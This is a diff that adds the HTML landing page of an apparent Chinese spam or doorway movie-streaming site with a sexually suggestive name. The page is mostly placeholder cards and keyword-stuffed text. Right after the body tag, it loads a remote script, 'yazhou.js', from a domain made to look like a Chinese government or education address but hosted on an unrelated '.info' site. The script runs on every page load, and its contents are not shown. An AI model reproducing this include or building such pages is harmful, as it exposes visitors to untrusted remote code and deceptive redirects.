@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>淫淫电影网 - 高清影视在线观看</title>
+<meta name="keywords" content="淫淫电影网,高清电影,在线观看,最新影片,电影分类">
+<meta name="description" content="淫淫电影网(yinyindianyingwang-app.github.io)提供最新高清电影、电视剧、综艺在线观看，每日更新，畅享极致观影体验。">
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #0a0a0a;
+    color: #e0e0e0;
+    line-height: 1.6;
+}
+
+a {
+    color: #ff6b6b;
+    text-decoration: none;
+    transition: color 0.3s;
+}
+
+a:hover {
+    color: #ffa502;
+}
+
+/* 头部 */
+.header {
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    padding: 1rem;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    box-shadow: 0 2px 20px rgba(0,0,0,0.5);
+}
+
+.nav-container {
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+}
+
+.logo {
+    font-size: 1.8rem;
+    font-weight: 900;
+    color: #ff6b6b;
+    text-shadow: 0 0 20px rgba(255,107,107,0.5);
+}
+
+.nav-menu {
+    display: flex;
+    gap: 1.5rem;
+    list-style: none;
+}
+
+.nav-menu a {
+    color: #e0e0e0;
+    font-weight: 500;
+    padding: 0.5rem 1rem;
+    border-radius: 25px;
+    transition: all 0.3s;
+}
+
+.nav-menu a:hover {
+    background: rgba(255,107,107,0.2);
+    color: #ff6b6b;
+}
+
+/* Banner */
+.banner {
+    background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
+                url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1200 400'%3E%3Crect fill='%231a1a2e' width='1200' height='400'/%3E%3Ccircle cx='200' cy='200' r='150' fill='%23ff6b6b' opacity='0.1'/%3E%3Ccircle cx='800' cy='150' r='200' fill='%2348dbfb' opacity='0.08'/%3E%3C/svg%3E");
+    background-size: cover;
+    background-position: center;
+    padding: 4rem 1rem;
+    text-align: center;
+}
+
+.banner h1 {
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+    color: #fff;
+    text-shadow: 0 0 30px rgba(255,107,107,0.8);
+}
+
+.banner p {
+    font-size: 1.1rem;
+    color: #aaa;
+    max-width: 600px;
+    margin: 0 auto 2rem;
+}
+
+.banner-btn {
+    display: inline-block;
+    background: linear-gradient(45deg, #ff6b6b, #ffa502);
+    color: #fff;
+    padding: 0.8rem 2.5rem;
+    border-radius: 50px;
+    font-weight: bold;
+    box-shadow: 0 4px 15px rgba(255,107,107,0.4);
+}
+
+/* 主内容 */
+.container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 2rem 1rem;
+}
+
+.section {
+    margin-bottom: 3rem;
+}
+
+.section-title {
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1.5rem;
+    padding-left: 1rem;
+    border-left: 4px solid #ff6b6b;
+}
+
+/* 卡片网格 */
+.card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 1.2rem;
+}
+
+.card {
+    background: #1a1a2e;
+    border-radius: 12px;
+    overflow: hidden;
+    transition: transform 0.3s, box-shadow 0.3s;
+    cursor: pointer;
+}
+
+.card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 25px rgba(255,107,107,0.2);
+}
+
+.card-img {
+    width: 100%;
+    height: 220px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 3rem;
+}
+
+.card-body {
+    padding: 0.8rem;
+}
+
+.card-title {
+    font-size: 0.95rem;
+    font-weight: 600;
+    color: #fff;
+    margin-bottom: 0.3rem;
+}
+
+.card-meta {
+    font-size: 0.8rem;
+    color: #888;
+}
+
+/* 分类标签 */
+.cat-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+    gap: 1rem;
+}
+
+.cat-item {
+    background: linear-gradient(135deg, #1a1a2e, #16213e);
+    border: 1px solid #2a2a4a;
+    border-radius: 10px;
+    padding: 1.5rem 1rem;
+    text-align: center;
+    transition: all 0.3s;
+}
+
+.cat-item:hover {
+    border-color: #ff6b6b;
+    background: rgba(255,107,107,0.1);
+}
+
+.cat-item span {
+    font-size: 2rem;
+    display: block;
+    margin-bottom: 0.5rem;
+}
+
+.cat-item h3 {
+    font-size: 0.9rem;
+    color: #e0e0e0;
+}
+
+/* 关于 */
+.about-text {
+    background: #1a1a2e;
+    padding: 2rem;
+    border-radius: 12px;
+    border: 1px solid #2a2a4a;
+}
+
+.about-text p {
+    margin-bottom: 1rem;
+    color: #bbb;
+}
+
+.about-text strong {
+    color: #ff6b6b;
+}
+
+/* 底部 */
+.footer {
+    background: #0f0f1a;
+    padding: 2rem 1rem;
+    text-align: center;
+    border-top: 1px solid #2a2a4a;
+}
+
+.footer p {
+    color: #666;
+    font-size: 0.85rem;
+    margin-bottom: 0.5rem;
+}
+
+.footer a {
+    color: #ff6b6b;
+}
+
+/* 响应式 */
+@media (max-width: 768px) {
+    .nav-container {
+        flex-direction: column;
+        gap: 1rem;
+    }
+    .nav-menu {
+        flex-wrap: wrap;
+        justify-content: center;
+    }
+    .banner h1 {
+        font-size: 1.8rem;
+    }
+    .card-grid {
+        grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+    }
+    .card-img {
+        height: 180px;
+    }
+}
+
+@media (max-width: 480px) {
+    .banner {
+        padding: 2.5rem 1rem;
+    }
+    .banner h1 {
+        font-size: 1.5rem;
+    }
+    .card-grid {
+        grid-template-columns: repeat(2, 1fr);
+    }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 头部导航 -->
+<header class="header">
+    <div class="nav-container">
+        <div class="logo">🎬 淫淫电影网</div>
+        <ul class="nav-menu">
+            <li><a href="#">首页</a></li>
+            <li><a href="#">最新影片</a></li>
+            <li><a href="#">影片分类</a></li>
+            <li><a href="#">关于我们</a></li>
+        </ul>
+    </div>
+</header>
+
+<!-- Banner -->
+<section class="banner">
+    <h1>淫淫电影网 - 畅享高清影视</h1>
+    <p>每日更新最新电影、热播剧集、综艺动漫，一站式观影体验，尽在 淫淫电影网</p>
+    <a href="#" class="banner-btn">立即观看</a>
+</section>
+
+<!-- 主内容 -->
+<main class="container">
+
+    <!-- 首页/最新推荐 -->
+    <section class="section" id="home">
+        <h2 class="section-title">🔥 最新推荐</h2>
+        <div class="card-grid">
+            <div class="card">
+                <div class="card-img">🎬</div>
+                <div class="card-body">
+                    <div class="card-title">热门动作大片</div>
+                    <div class="card-meta">2024 · 动作</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img" style="background:linear-gradient(135deg,#f093fb,#f5576c);">🎭</div>
+                <div class="card-body">
+                    <div class="card-title">爱情喜剧精选</div>
+                    <div class="card-meta">2024 · 喜剧</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img" style="background:linear-gradient(135deg,#4facfe,#00f2fe);">🚀</div>
+                <div class="card-body">
+                    <div class="card-title">科幻视觉盛宴</div>
+                    <div class="card-meta">2024 · 科幻</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img" style="background:linear-gradient(135deg,#43e97b,#38f9d7);">👻</div>
+                <div class="card-body">
+                    <div class="card-title">悬疑惊悚合集</div>
+                    <div class="card-meta">2024 · 悬疑</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img" style="background:linear-gradient(135deg,#fa709a,#fee140);">🎨</div>
+                <div class="card-body">
+                    <div class="card-title">文艺剧情佳作</div>
+                    <div class="card-meta">2024 · 剧情</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img" style="background:linear-gradient(135deg,#a18cd1,#fbc2eb);">🎪</div>
+                <div class="card-body">
+                    <div class="card-title">动漫动画精选</div>
+                    <div class="card-meta">2024 · 动画</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 最新影片 -->
+    <section class="section" id="latest">
+        <h2 class="section-title">📅 最新影片</h2>
+        <div class="card-grid">
+            <div class="card">
+                <div class="card-img" style="background:linear-gradient(135deg,#ff9a9e,#fad0c4);">🎞️</div>
+                <div class="card-body">
+                    <div class="card-title">最新上映电影</div>
+                    <div class="card-meta">更新于今天</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img" style="background:linear-gradient(135deg,#ffecd2,#fcb69f);">📺</div>
+                <div class="card-body">
+                    <div class="card-title">热播电视剧集</div>
+                    <div class="card-meta">更新至第12集</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img" style="background:linear-gradient(135deg,#ffd1ff,#fad0c4);">🎤</div>
+                <div class="card-body">
+                    <div class="card-title">综艺娱乐节目</div>
+                    <div class="card-meta">每周五更新</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-img" style="background:linear-gradient(135deg,#c2e9fb,#a1c4fd);">🎯</div>
+                <div class="card-body">
+                    <div class="card-title">纪录片精选</div>
+                    <div class="card-meta">高分推荐</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 影片分类 -->
+    <section class="section" id="category">
+        <h2 class="section-title">📂 影片分类</h2>
+        <div class="cat-grid">
+            <a href="#" class="cat-item">
+                <span>💥</span>
+                <h3>动作片</h3>
+            </a>
+            <a href="#" class="cat-item">
+                <span>😂</span>
+                <h3>喜剧片</h3>
+            </a>
+            <a href="#" class="cat-item">
+                <span>💕</span>
+                <h3>爱情片</h3>
+            </a>
+            <a href="#" class="cat-item">
+                <span>🚀</span>
+                <h3>科幻片</h3>
+            </a>
+            <a href="#" class="cat-item">
+                <span>👻</span>
+                <h3>恐怖片</h3>
+            </a>
+            <a href="#" class="cat-item">
+                <span>🎭</span>
+                <h3>剧情片</h3>
+            </a>
+            <a href="#" class="cat-item">
+                <span>🎨</span>
+                <h3>动画片</h3>
+            </a>
+            <a href="#" class="cat-item">
+                <span>📺</span>
+                <h3>电视剧</h3>
+            </a>
+        </div>
+    </section>
+
+    <!-- 关于我们 -->
+    <section class="section" id="about">
+        <h2 class="section-title">ℹ️ 关于 淫淫电影网</h2>
+        <div class="about-text">
+            <p><strong>淫淫电影网</strong>（网址：<a href="https://yinyindianyingwang-app.github.io">https://yinyindianyingwang-app.github.io</a>）是一个专注于高清影视在线观看的网站。</p>
+            <p>我们每日更新最新电影、热播电视剧、综艺节目和动漫资源，致力于为用户提供极致的观影体验。</p>
+            <p>网站特色：</p>
+            <p>✅ 高清画质 · 流畅播放<br>✅ 每日更新 · 资源丰富<br>✅ 免费观看 · 无需注册<br>✅ 移动端自适应 · 随时随地看</p>
+            <p>访问 <strong>淫淫电影网</strong>，发现更多精彩影视内容！</p>
+        </div>
+    </section>
+
+</main>
+
+<!-- 底部 -->
+<footer class="footer">
+    <p>© 2024 <strong>淫淫电影网</strong> (淫淫电影网) - 高清影视在线观看</p>
+    <p>网址：<a href="https://yinyindianyingwang-app.github.io">https://yinyindianyingwang-app.github.io</a></p>
+    <p>关键词：淫淫电影网、高清电影、在线观看、最新影片</p>
+</footer>
+
+</body>
+</html>
